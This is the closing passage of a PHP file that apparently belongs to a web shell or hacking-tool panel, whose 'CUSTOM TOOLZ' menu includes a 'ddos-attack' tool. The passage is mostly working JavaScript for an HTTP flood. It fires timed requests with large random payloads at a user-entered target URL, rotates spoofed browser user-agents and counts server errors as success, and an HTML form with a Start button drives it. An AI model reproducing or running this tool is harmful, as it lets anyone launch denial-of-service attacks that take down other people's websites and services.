			  <h3>".$menu_tools[$z]['title']." v".$menu_tools[$z]['ver']."</h3>
			  <h3> by: ".$menu_tools[$z]['auth']."</h3>
		  </div>";

		print "Coming Soon";
	}
	if($z=="ddos-attack")
	{
		print "<div class='tools-header'>
			<h3>".$menu_tools[$z]['title']." v".$menu_tools[$z]['ver']."</h3>
			<h3> by: ".$menu_tools[$z]['auth']."</h3>
		  </div>";

		printf('<script type="text/javascript">

					window.onload=function(){

						startTime();

						var interval;
						var xhttp;

						var requestsNode=document.getElementById("requests"),
					        successNode=document.getElementById("success"),
					        proccessNode=document.getElementById("proccess"),
					        targetNode=document.getElementById("target"),
					        attack=document.getElementById("attack"),
					        method=document.getElementById("method"),
					        size=document.getElementById("size"),
					        time=document.getElementById("time"),
					        stamp=document.getElementById("stamp")
					        uagent=document.getElementById("uagent")
					        referer=document.getElementById("referer")
					        origin=document.getElementById("origin")

						var requests=0,
					        succeeded=0,
					        proccess=0;

						var makeHttpRequest=function(){
							var data=new FormData();
							var buff=new ArrayBuffer(65536);
							var xhrx=new XMLHttpRequest();
							var agent =["Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:5.0) Gecko/20110619 Firefox/5.0",
							"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:5.0) Gecko/20100101 Firefox/5.0",
							"Mozilla/5.0 (Windows NT 6.2; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
							"Mozilla/5.0 (Windows NT 5.2; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
							"Mozilla/5.0 (Windows NT 5.0; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
							"Mozilla/5.0 (Windows NT 5.1; U; rv:5.0) Gecko/20100101 Firefox/5.0",
							"Mozilla/5.0 (Windows NT 6.1.1; rv:5.0) Gecko/20100101 Firefox/5.0",
							"Mozilla/5.0 (Windows NT 5.1; rv:2.0.1) Gecko/20100101 Firefox/5.0",
							"Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20100101 Firefox/5.0",
							"Mozilla/5.0 (Windows NT 5.0; rv:5.0) Gecko/20100101 Firefox/5.0"];
							randomize=function(arr){
							rand=Math.floor((Math.random()*arr.length));
						    return arr[rand];}
							xhrx.open(method.value,targetNode.value,true);
							if (uagent.checked) xhrx.setRequestHeader("user-agent",randomize(agent));
							if (referer.checked) xhrx.setRequestHeader("referer",targetNode.value);
							if (origin.checked) xhrx.setRequestHeader("origin","*");
							xhrx.onreadystatechange=function(){
							    if(xhrx.readyState==XMLHttpRequest.DONE){
							    	if(xhrx.status>=500){
								    	onSuccess();
								    }
								    onProcess();
							   	}
							   	onRequest();
							}
							xhttp=xhrx;
							attack=function(){
							str="";arr=new Uint32Array(buff);
							window.crypto.getRandomValues(arr);
							for(var i=0;i<arr.length;i++){
							str+=String.fromCharCode(arr[i]);
							}return str;}
							what=attack();
							for(var j=0;j<size.value;j++){
							data.append(what, stamp.value);}
							xhrx.send(data);
					        };

						var onRequest=function(){
					            requests++;
					            requestsNode.innerHTML=requests;
						    };

						var onProcess=function(){
						    	proccess++;
					            proccessNode.innerHTML=proccess;
						    };

						var onSuccess=function(){
					            success++;
					            successNode.innerHTML=success;
					    	};

						attack.onclick=function(){
							var today=new Date();
						    var h=today.getHours();
						    var m=today.getMinutes();
						    var s=today.getSeconds();
						    m=m<10?"0"+m:m;
						    s=s<10?"0"+s:s;
							if(this.value==\'Start\'){
								this.value="Stop";
								requests=0;
						        succeeded=0;
						        proccess=0;
						        document.getElementById("start").innerHTML="00:00:00";
						        document.getElementById("finish").innerHTML="00:00:00";
								interval=setInterval(makeHttpRequest,(parseInt(time.value)));
								document.getElementById("start").innerHTML=h+":"+m+":"+s;
							}else if(this.value==\'Stop\'){
								this.value="Start";
								xhttp.abort();
								clearInterval(interval);
								document.getElementById("finish").innerHTML=h+":"+m+":"+s;
							}
						};

						function startTime(){
						    var today=new Date();
						    var h=today.getHours();
						    var m=today.getMinutes();
						    var s=today.getSeconds();
						    m=m<10?"0"+m:m;
						    s=s<10?"0"+s:s;
						    document.getElementById("times").innerHTML=h+":"+m+":"+s;
						    var t=setTimeout(startTime,500);
						}
					}
				</script>
				<form onsubmit="return false;" class="new">
					<label>Target</label><input type="text" id="target" value="http://www.target.com"><br>
					<label>Stamp</label><input type="text" id="stamp" value="DDOS ATTACK !!!"><br>
					<label>Method</label><select id="method">
					<option value="PUT">PUT</option>
					<option value="GET">GET</option>
					<option value="POST">POST</option>
					<option value="HEAD">HEAD</option>
					<option value="TRACE">TRACE</option>
					<option value="PATCH">PATCH</option>
					<option value="OPTIONS">GET</option>
					<option value="DELETE">DELETE</option>
					<option value="CONNECT">CONNECT</option>
					<option value="OPTIONS">OPTIONS</option>
					</select><br>
					<label>Size (kB)</label><input type="number" id="size" value="1024"><br>
					<label>Time (ms)</label><input type="number" id="time" value="500"><br>
					<label>Options</label>
					<input type="checkbox" id="uagent" name="uagent" style="vertical-align:middle"> User Agent
					<input type="checkbox" id="referer" name="referer" style="vertical-align:middle"> Referer  Target
					<input type="checkbox" id="origin" name="origin" style="vertical-align:middle"> Origin<br>
					<label style="margin:5px 0px 5px">
						Time <span id="times">00:00:00</span> | 
						Start <span id="start">00:00:00</span> | 
						Finish <span id="finish">00:00:00</span>
					</label><br>
					<label style="margin:0px 0px 5px">
						Requests <span id="requests">0</span> | 
						Proccess <span id="proccess">0</span> | 
						Success <span id="success">0</span>
					</label><br>
					<input type="submit" id="attack" value="Start"/>
				</form>');
	}

	print "</div>";
}
/* END CUSTOM TOOLZ */
$endScriptTime=microtime(TRUE);
$totalScriptTime=$endScriptTime-$start;
printf("</div><!-- content -->
		</div><!-- container -->
			<div id='footer'>
				<div id='copyrights'>&copy; %s maRidoNo</div>
				<div id='pageload'>Page Loaded in  %s Seconds</div>
			</div>
		</body>
		</html>",date('Y'),number_format($totalScriptTime, 4)
);



}?>